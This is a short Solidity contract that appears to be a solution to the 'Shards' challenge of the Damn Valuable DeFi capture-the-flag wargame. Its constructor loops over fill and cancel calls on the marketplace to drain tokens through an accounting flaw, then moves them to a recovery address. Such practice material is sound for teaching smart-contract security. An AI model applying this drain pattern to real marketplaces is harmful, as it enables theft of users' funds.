// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {
    ShardsNFTMarketplace,
    DamnValuableToken
} from "../../src/shards/ShardsNFTMarketplace.sol";

contract Attacker{
    constructor(ShardsNFTMarketplace marketplace, DamnValuableToken token, address recovery, uint256 want, uint256 loop) {
        for (uint256 i = 0; i < loop; i++) {
            marketplace.fill(1, want);
            marketplace.cancel(1, i);
        }
        token.transfer(recovery, token.balanceOf(address(this)));
    }
}